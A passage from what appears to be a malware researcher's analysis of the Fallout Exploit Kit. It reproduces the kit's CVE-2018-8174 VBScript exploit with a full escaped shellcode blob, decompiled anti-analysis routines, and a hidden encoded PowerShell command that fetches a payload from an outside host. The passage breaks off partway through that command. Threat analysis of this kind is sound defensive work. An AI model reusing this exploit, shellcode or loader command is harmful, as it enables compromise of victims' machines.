            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"devicefont"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"salign"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"allowScriptAccess"</span> <span class="na">value=</span><span class="s">"sameDomain"</span> <span class="nt">/&gt;&lt;/object&gt;&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>Thus, the swf file that exploits CVE-2018-15982 is read and executed.</p>

<h2 id="cve-2018-8174">CVE-2018-8174</h2>
<p>The exploit code used is very similar to PoC.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Sub</span> <span class="nf">StartExploit</span>
	<span class="n">UAF</span>
	<span class="n">InitObjects</span>
	<span class="n">vb_adrr</span><span class="o">=</span><span class="n">LeakVBAddr</span><span class="p">()</span>
	<span class="n">vbs_base</span><span class="o">=</span><span class="n">GetBaseByDOSmodeSearch</span><span class="p">(</span><span class="n">GetUint32</span><span class="p">(</span><span class="n">vb_adrr</span><span class="p">))</span>
	<span class="n">msv_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">vbs_base</span><span class="p">,</span><span class="s">"msvcrt.dll"</span><span class="p">)</span>
	<span class="n">krb_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">msv_base</span><span class="p">,</span><span class="s">"kernelbase.dll"</span><span class="p">)</span>
	<span class="n">ntd_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">msv_base</span><span class="p">,</span><span class="s">"ntdll.dll"</span><span class="p">)</span>
	<span class="n">VirtualProtectAddr</span><span class="o">=</span><span class="n">GetProcAddr</span><span class="p">(</span><span class="n">krb_base</span><span class="p">,</span><span class="s">"VirtualProtect"</span><span class="p">)</span>
	<span class="n">NtContinueAddr</span><span class="o">=</span><span class="n">GetProcAddr</span><span class="p">(</span><span class="n">ntd_base</span><span class="p">,</span><span class="s">"NtContinue"</span><span class="p">)</span>
	<span class="n">SetMemValue</span> <span class="n">GetShellcode</span><span class="p">()</span>
	<span class="n">ShellcodeAddr</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span><span class="o">+</span><span class="mi">8</span>
	<span class="n">SetMemValue</span> <span class="n">WrapShellcodeWithNtContinueContext</span><span class="p">(</span><span class="n">ShellcodeAddr</span><span class="p">)</span>
	<span class="n">lIlll</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span><span class="o">+</span><span class="mi">69596</span>
	<span class="n">SetMemValue</span> <span class="n">ExpandWithVirtualProtect</span><span class="p">(</span><span class="n">lIlll</span><span class="p">)</span>
	<span class="n">llIIll</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span>
	<span class="n">ExecuteShellcode</span>
<span class="k">End</span> <span class="k">Sub</span>
<span class="n">StartExploit</span>
</code></pre></div></div>

<p>The process to generate shellcode is like this.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Function</span> <span class="nf">GetShellcode</span><span class="p">()</span>
	<span class="n">IIlI</span><span class="o">=</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u0000%u0000%u0000%u0000"</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u8B55%u83EC%uF8E4%uEC81%u00CC%u0000%u5653%uE857%u08B0%u0000%uF08B%u44C7%u1824%u05CD%u5379%u848D%uB024%u0000%u8900%u2474%u8934%u2444%u8D14%u2454%u8D10%u2444%uC744%u2444%u1D1C%u2BDE%u8982%u2444%u8D10%u244C%u8D14%u2484%u0094%u0000%u4489%u2824%u448D%u1824%u8D50%u2444%u502C%u1EE8%u0006%u8B00%u245C%u8D18%u244C%u8B18%u247C%u8B1C%u8903%u2444%u8B40%u1C47%u4489%u4424%u478B%u8920%u2444%u3348%u89C0%u2444%u8918%u2444%u891C%u2444%uE834%u02E9%u0000%u548D%u1C24%uCF8B%u66E8%u0002%u8300%u2464%u0038%u4C8D%u2024%u406A%uE856%u02FE%u0000%uC683%u8D40%u244C%u6828%u0080%u0000%uE856%u02EC%u0000%u74FF%u2C24%u4C8B%u5024%u448D%u4824%u74FF%u2C24%uD68B%u74FF%u4824%u5753%u8D50%u2444%u5060%u448D%u4C24%uE850%u0389%u0000%uDB33%uC483%u3938%u245C%u742C%u8B41%u2474%u8D38%u2444%u6A48%u5F44%u5357%uFF50%u83D6%u0CC4%u7C89%u4824%u448D%u1824%u106A%u5053%uD6FF%uC483%u8D0C%u2444%u5018%u448D%u4C24%u5350%u6853%u0000%u0800%u5353%uFF53%u2474%u5350%u54FF%u6424%uFF53%u2454%u5F44%u5B5E%uE58B%uC35D%u8B55%u83EC%u0CEC%u458B%u890C%uF445%u458B%u8908%uF845%u6583%u00FC%u07EB%u458B%u40FC%u4589%u8BFC%uFC45%u453B%u7310%u8B12%uF845%u4503%u8BFC%uF44D%u4D03%u8AFC%u8809%uEB08%uC9DF%u55C3%uEC8B%u458B%u0F08%u00BE%uC085%u2D74%u458B%u0F08%u00BE%uF883%u7C41%u8B19%u0845%uBE0F%u8300%u5AF8%u0E7F%u458B%u0F08%u00BE%uC083%u8B20%u084D%u0188%u458B%u4008%u4589%uEB08%u5DC9%u55C3%uEC8B%u8B51%u0845%u4589%uEBFC%u8B07%uFC45%u8940%uFC45%u458B%u0FFC%u00BE%uC085%u0274%uEDEB%u458B%u2BFC%u0845%uC3C9%u5653%u8B57%u33D9%u53FF%u3347%uE8F6%uFFC9%uFFFF%u8B59%u85C8%u74C9%u0F24%u03B6%uD233%uC703%uF1BF%u00FF%uF700%u43F7%uFA8B%uD233%u048D%uBE3E%uFFF1%u0000%uF6F7%uF28B%uE983%u7501%uC1DC%u10E6%u048D%u5F37%u5B5E%u55C3%uEC8B%uEC83%u5310%u5756%uF98B%u5589%u33FC%u8BF6%u3C47%u5C8B%u7838%uDF03%u438B%u8B1C%u204B%uC703%u4589%u03F0%u8BCF%u2443%uC703%u4D89%u89F8%uF445%u7339%u7618%u8B18%uB10C%uCF03%u7BE8%uFFFF%u3BFF%uFC45%u1074%u4D8B%u46F8%u733B%u7218%u33E8%u5FC0%u5B5E%uC3C9%u458B%u8BF4%uF04D%uB70F%u7004%u048B%u0381%uEBC7%u64EA%u30A1%u0000%u8B00%u0C40%u408B%u8B14%u8B00%u8B00%u1040%u64C3%u30A1%u0000%u8B00%u0C40%u408B%u8B14%u8B00%u1040%u56C3%u8B57%u8BF9%u56F2%u078B%uD0FF%uC085%u0675%u478B%u5604%uD0FF%u5E5F%u56C3%uF18B%uE856%uFEAB%uFFFF%u8B59%uE8CE%uFF06%uFFFF%u3D5E%u06DE%u3F54%u1F74%u413D%uCD05%u7425%u3D18%u0309%u0F05%u1174%uEC3D%u1803%u7416%u3D0A%u044B%u19F3%u0374%uC033%u33C3%u40C0%u55C3%uEC8B%uEC81%u013C%u0000%u418B%u5308%u5756%uFA8B%uDB33%u518B%u890C%uF855%u518B%u8B10%u1449%u6A53%u8902%uFC55%u4D89%uFFF4%u8BD0%u83F0%uFFFE%u4074%u858D%uFEC8%uFFFF%u85C7%uFEC8%uFFFF%u0128%u0000%u5650%u55FF%u85F8%u74C0%u8D27%uEC8D%uFFFE%uE8FF%uFF6F%uFFFF%uC085%u1575%u858D%uFEC8%uFFFF%u5650%u55FF%u85FC%u75C0%u56E2%u55FF%uEBF4%u3303%u43DB%u1F89%u5E5F%uC95B%u55C3%uEC8B%uEC83%u5310%u5756%uC033%uF98B%u3340%u53C9%uA20F%uF38B%u8D5B%uF05D%u0389%u7389%u8904%u084B%u5389%u8B0C%uF845%uE8C1%u891F%u5F07%u5B5E%uC3C9%u8B55%u81EC%u04EC%u0001%u5300%u3356%u57F6%uC68B%u8488%uFC05%uFFFE%u40FF%u003D%u0001%u7200%u8BF1%u8BDE%u8BFE%u8AF1%u3D94%uFEFC%uFFFF%uC78B%uE083%u0F07%uCAB6%uB60F%u3004%uC303%uC803%uB60F%u8AD9%u1D84%uFEFC%uFFFF%u8488%uFC3D%uFFFE%u47FF%u9488%uFC1D%uFFFE%u81FF%u00FF%u0001%u7200%u8BC8%u0C7D%uF633%uDE8B%uFF85%u5574%u458B%u8908%u0C45%u438D%u0F01%uD8B6%u948A%uFC1D%uFFFE%u0FFF%uC2B6%uC603%uB60F%u8AF0%u3584%uFEFC%uFFFF%u8488%uFC1D%uFFFE%u88FF%u3594%uFEFC%uFFFF%uB60F%u1D8C%uFEFC%uFFFF%uB60F%u03C2%u8BC8%u0C45%uB60F%u8AC9%u0D8C%uFEFC%uFFFF%u0830%u8940%u0C45%uEF83%u7501%u8BB1%u0845%u5E5F%uC95B%u55C3%uEC8B%uEC83%u8B48%u1C45%u4D89%u53F4%u8B56%u8B08%u0870%u4D89%u8BF8%u0448%u4D89%u8BF0%u0C48%u4D89%u8BE8%u1048%u4D89%u8BE0%u1448%u4D89%u8BD8%u1848%u458B%u5714%u046A%u5589%u8BEC%u1850%u4D89%u8BC8%u2448%u458B%u6818%u1000%u0000%u046A%u006A%u388B%u5589%u89D4%uFC4D%u7D89%uFFD0%u6AD2%u8B04%u6AD8%u5300%u5D89%uFFE4%u83D7%u207D%u8D00%u1445%u046A%u5350%u1875%u7D83%u0024%u0975%u45C7%uC614%u90EA%uEB2A%uC71D%u1445%uF9D7%u2A90%u14EB%u7D83%u0024%u45C7%uD214%u90EB%u752A%uC707%u1445%uE4D2%u2A90%u29E8%uFFFC%u8BFF%u084D%u458D%u83C0%u0CC4%u45C7%uF4C0%uDBBC%uC770%uC445%uE14D%u1989%u086A%uE850%uFE76%uFFFF%u5959%uDB33%u458D%u53C0%u5353%u5053%u55FF%u8BF8%u85F8%u75FF%u8B0A%u1045%u1889%u23E9%u0001%u5300%u6A53%u5303%u6853%u01BB%u0000%u75FF%u57F4%u55FF%u8BF0%u89D8%u145D%uDB85%u840F%u00FB%u0000%u4D8B%u8D08%uB845%u086A%uC750%uB845%uC6E5%u1DB0%u45C7%u7CBC%uB9D1%uE819%uFE1C%uFFFF%u5959%uC033%u6850%u3000%u8080%u5050%uFF50%uEC75%u458D%u50B8%uFF53%uE855%uD88B%uDB85%u840F%u00B8%u0000%u046A%u75FF%u6AE4%u6A00%u5300%u55FF%u85E0%u0FC0%uA084%u0000%u8300%u1C65%u8D00%uDC45%u6583%u00DC%u8D50%u1845%u45C7%u0418%u0000%u5000%u458D%u501C%u0568%u0000%u5320%u55FF%u83D8%u187D%u7400%u8376%u1C7D%u7400%u6A70%u6804%u1000%u0000%u75FF%u6A1C%uFF00%uD455%u75FF%u8B1C%u0C4D%u006A%u8950%uFF01%uD055%u6583%u00CC%u458D%u50CC%u458B%uFF0C%u1C75%u30FF%uFF53%uC855%uFF53%uFFD6%u1475%uD6FF%uFF57%u83D6%u207D%u8B00%uFC75%u0474%u006A%uD6FF%u7D83%u0024%u0474%u006A%uD6FF%u458B%uFF0C%u1C75%u4D8B%uFF08%uE830%uFD52%uFFFF%u458B%u5910%uC759%u0100%u0000%uEB00%u5311%uD6FF%u75FF%uFF14%u57D6%uD6FF%u458B%u8310%u0020%u5E5F%uC95B%u55C3%uEC8B%uEC83%u5310%u8B56%u8BF1%u57DA%u7589%uE8FC%uFBF7%uFFFF%uF88B%u43BA%u1C04%u8B19%uE8CF%uFB83%uFFFF%u368B%u75BA%uB905%u8B28%u89CF%u1446%u72E8%uFFFB%u8BFF%uFC75%u51BA%u3209%u8B73%u890E%u1C41%uCF8B%u5EE8%uFFFB%u8BFF%uBA0E%u0614%u33F5%u4189%u8B08%uE8CF%uFB4D%uFFFF%u0E8B%u97BA%u8104%u891D%u8B01%uE8CF%uFB3D%uFFFF%u0E8B%u4DBA%u8505%u8927%u0441%uCF8B%u2CE8%uFFFB%u8BFF%uBA0E%u04E4%u2259%u4189%u8B0C%uE8CF%uFB1B%uFFFF%u0E8B%uD3BA%u7004%u891F%u1041%uCF8B%u0AE8%uFFFB%u8BFF%uBA0E%u047A%u1A1E%u4189%u8B18%uE8CF%uFAF9%uFFFF%u0E8B%uF3BA%u8503%u8915%u2041%uCF8B%uE8E8%uFFFA%u8BFF%u890E%u2441%u58E8%uFFFB%uBAFF%u028C%u08D8%uC88B%uD2E8%uFFFA%u8BFF%u6A0B%u890C%u8D01%uF045%u4D8B%u500C%u45C7%uC2F0%u8DE0%uC720%uF445%uB412%u37CD%u45C7%uEFF8%uF16B%uE8A4%uFC34%uFFFF%u5959%u0E8B%u558D%uE8F0%uFB2B%uFFFF%uF88B%u5DBA%u1006%u8B36%uE8CF%uFA91%uFFFF%u758B%uBA08%u0584%u29FB%u0E8B%u4189%u8B0C%uE8CF%uFA7D%uFFFF%u0E8B%u55BA%uC706%u8935%u1441%uCF8B%u6CE8%uFFFA%u8BFF%uBA0E%u078C%u4B92%u4189%u8B10%uE8CF%uFA5B%uFFFF%u0E8B%u55BA%u6406%u8936%u0841%uCF8B%u4AE8%uFFFA%u8BFF%uBA0E%u051D%u245C%u4189%u8B04%uE8CF%uFA39%uFFFF%u0E8B%u46BA%uC006%u8935%u8B01%uE8CF%uFA29%uFFFF%u0E8B%u5E5F%u895B%u1841%uC3C9%uECD7%u2182%uA319%u2DD6%u29FE%uCBFE%u5CE9%uB27D%u501A%uCF26%u6A47%u54FE%uDABA%u8A85%uEF83%u3361%u09D1%u20F7%u16EC%uD9B7%u917A%uDE1A%u2281%uEA7F%u3143%u6ACE%u1A52%u4FF4%u500B%uC276%u5A57%uC1F8%uE09A%u258F%uA209%u6BCD%u28EE%uE3E7%u2FD5%u8D28%u3568%uAE4A%u0623%u309B%u8E87%uE4E0%u8EF7%u5F02%u7AB4%u73DA%u7483%uB0D2%uBC0E%uB049%u40EE%u8610%u7665%u07AF%u7330%u3C80%u6436%uF745%u5A61%uC1F8%uBBE2%u5581%uF71D%u00A7%u7F8D%u4907%u11AF%uB565%uF4E6%u755E%u19EE%u23AF%u8DB6%uEB89%u2838%u11BF%uC109%u1219%uD17E%uBEEA%uDD49%uF759%u09D6%uEA08%u8E45%uB602%u1B93%u19C4%u9146%uB94D%u9E6C%u0BC7%u00E8%u0000%u5800%uE883%u2D05%u00C0%u0000%u00C3"</span> <span class="o">&amp;</span><span class="n">lIIII</span><span class="p">(</span><span class="n">IIIII</span><span class="p">(</span><span class="s">""</span><span class="p">)))</span>
	<span class="n">IIlI</span><span class="o">=</span><span class="n">IIlI</span> <span class="o">&amp;</span> <span class="kt">String</span><span class="p">((</span><span class="o">&amp;</span><span class="n">h80000</span><span class="o">-</span><span class="n">LenB</span><span class="p">(</span><span class="n">IIlI</span><span class="p">))</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u4141"</span><span class="p">))</span>
	<span class="n">GetShellcode</span><span class="o">=</span><span class="n">IIlI</span>
<span class="k">End</span> <span class="k">Function</span>
</code></pre></div></div>

<p>Let’s read shellcode.</p>

<h2 id="shellcode">Shellcode</h2>
<p>The decoding algorithm in the shellcode has not changed from v3 and remains RC4.
<a href="https://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html">Analysis of Fallout Exploit Kit v3</a></p>

<p>The hash algorithm of API hash has not changed either.
API hashed by the dualaccModFFF1Hash algorithm.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__thiscall</span> <span class="nf">dualaccModFFF1Hash</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// ebx</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// esi</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// ecx</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// edx</span>

  <span class="n">v1</span> <span class="o">=</span> <span class="n">this</span><span class="p">;</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">zz_count</span><span class="p">(</span><span class="n">this</span><span class="p">);</span> <span class="n">i</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">v2</span> <span class="o">+</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="n">v1</span><span class="o">++</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xFFF1</span><span class="p">;</span>
    <span class="n">v2</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="n">v3</span> <span class="o">+</span> <span class="n">v5</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xFFF1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v2</span> <span class="o">+</span> <span class="p">(</span><span class="n">v3</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>However, there were interesting changes.
Analysis environment detection codes has been added in shellcode.</p>

<h3 id="vm-detection">VM Detection</h3>

<p>Query hypervisor precense using CPUID.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__thiscall</span> <span class="nf">zz_vm_detect</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="n">v1</span> <span class="o">=</span> <span class="n">this</span><span class="p">;</span>
  <span class="n">_EAX</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="kr">__asm</span> <span class="p">{</span> <span class="n">cpuid</span> <span class="p">}</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">_ECX</span> <span class="o">&gt;&gt;</span> <span class="mi">31</span><span class="p">;</span>
  <span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="n">_ECX</span> <span class="o">&gt;&gt;</span> <span class="mi">31</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="process-detection">Process Detection</h3>
<p>Get a list of running processes.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/03.jpg" /></p>

<p>Convert process name to lower case.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">zz_tolowercase</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="n">a1</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span> <span class="o">&lt;=</span> <span class="mi">90</span> <span class="p">)</span>
      <span class="o">*</span><span class="n">a1</span> <span class="o">+=</span> <span class="mi">32</span><span class="p">;</span>
    <span class="o">++</span><span class="n">a1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Compare to the following hashes.
Once again, It uses the dualaccModFFF1Hash algorithm.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x3F5406DE
0x25CD0541
0x0F050309
0x161803EC
0x19F3044B
</code></pre></div></div>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/04.jpg" /></p>

<p>Two process names were identified. I do not know the others.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dualaccModFFF1Hash</span><span class="p">(</span><span class="s">"wireshark.exe"</span><span class="p">))</span>
<span class="s">'0x25cd0541'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dualaccModFFF1Hash</span><span class="p">(</span><span class="s">"fiddler.exe"</span><span class="p">))</span>
<span class="s">'0x19f3044b'</span>
</code></pre></div></div>

<p>Like v3, shellcode downloads, decodes and executes encrypted PowerShell code.</p>

<h2 id="powershell">PowerShell</h2>
<p>The PowerShell code to be executed is like this.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="nt">-noni</span><span class="w"> </span><span class="nt">-enc</span><span class="w"> </span><span class="nx">dAByAHkAewAkAGwAMQBJAGwAMQA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQA7ACQAbAAxAEkAbAAxAGwASQAxAEkASQBsAD0AJABsADEASQBsADEALgBHAGUAdABUAHkAcABlACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAFUAMwBsAHoAZABHAFYAdABMAGsAMQBoAGIAbQBGAG4AWgBXADEAbABiAG4AUQB1AFEAWABWADAAYgAyADEAaABkAEcAbAB2AGIAaQA1AEIAYgBYAE4AcABWAFgAUgBwAGIASABNAD0AJwApACkAKQA7ACQASQAxAEkAbAAxADEAbAAxAEkAbAA9ACQAbAAxAEkAbAAxAGwASQAxAEkASQBsAC4ARwBlAHQARgBpAGUAbABkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAFkAVwAxAHoAYQBVAGwAdQBhAFgAUgBHAFkAVwBsAHMAWgBXAFEAPQAnACkAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAkAEkAMQBJAGwAMQAxAGwAMQBJAGwALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AH0AYwBhAHQAYwBoAHsAfQA7AEEAZABkAC0AVAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAIgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwAKQBdAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABJADEAbABJAEkAMQBJAGwAMQB7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAEkAbABJADEAOwBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAbABJAGwAMQBJADEASQBJADEAbAA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkASQBJAEkASQBsAEkASQA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkAbAAxADEAMQBsAEkAbAAxAEkAMQBJADsAfQBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwALABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUAKQBdAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABsAEkAMQBsAGwAMQBJAGwAMQBJADEAbAB7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkASQBJAGwASQA7AHAAdQBiAGwAaQBjACAAcwB0AHIAaQBuAGcAIABJAGwAMQBsADEAOwBwAHUAYgBsAGkAYwAgAHMAdAByAGkAbgBnACAAbABJADEAbABsADsAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAEkAbAAxADEAMQBJAEkASQBsADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAASQAxAGwASQBsADEAbABsADEASQA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkAbABJAEkASQBsADEAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABsAGwAMQAxAEkAbABsADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAASQBsADEASQBsAEkAbAAxADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAbABJAGwASQBJAEkAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABsAEkAMQBsAEkAbABJADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAbABJADEAbAAxADEAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABJAGwAbAAxAEkAbAA7AHAAdQBiAGwAaQBjACAAcwBoAG8AcgB0ACAASQBsAEkASQAxADsAcAB1AGIAbABpAGMAIABzAGgAbwByAHQAIABJAGwAbABJAGwAbAA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABsAGwASQBsAEkAbABJAGwASQA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAGwAbAAxAEkAbABJAGwASQA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAGwAbABJAGwAbABsAEkAMQBJADEAOwBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAASQAxAEkASQBJADsAfQA7AHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABjAGwAYQBzAHMAIABsADEASQBsADEAMQBJAEkASQB7AFsARABsAGwASQBtAHAAbwByAHQAKAAiACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAiACwAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwAoAHMAdAByAGkAbgBnACAASQBJAGwASQBJAEkALABzAHQAcgBpAG4AZwAgAEkAbABJAGwASQAsAEkAbgB0AFAAdAByACAASQAxADEAbAAxAEkALABJAG4AdABQAHQAcgAgAGwAMQBsAEkAMQAsAGIAbwBvAGwAIABJAGwASQAxADEASQBJADEAMQAxADEALAB1AGkAbgB0ACAAbAAxADEAMQBJACwASQBuAHQAUAB0AHIAIABsAEkASQBJADEASQBsAGwASQAsAHMAdAByAGkAbgBnACAASQAxAEkAbAAxAGwASQAsAHIAZQBmACAAbABJADEAbABsADEASQBsADEASQAxAGwAIABsAGwAMQAxAEkASQBsADEASQAsAG8AdQB0ACAASQAxAGwASQBJADEASQBsADEAIABsAEkASQAxAEkASQApADsAfQAiADsAJABsAGwAbAAxAEkAbABsAEkAMQA9ACIAJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwATABvAHcAXAAkACgALQBqAG8AaQBuACgAKAA0ADgALgAuADUANwApACsAKAA2ADUALgAuADkAMAApACsAKAA5ADcALgAuADEAMgAyACkAfABHAGUAdAAtAFIAYQBuAGQAbwBtACAALQBDAG8AdQBuAHQAIAA4AHwAJQB7AFsAYwBoAGEAcgBdACQAXwB9ACkAKQAuAHQAbQBwACIAOwAkAEkAMQBsADEAMQBJADEAPQAnAGgAdAB0AHAAOgAvAC8AYgBlAGEAaABlAHIAbwA0AHUALgBjAG8AbQAvA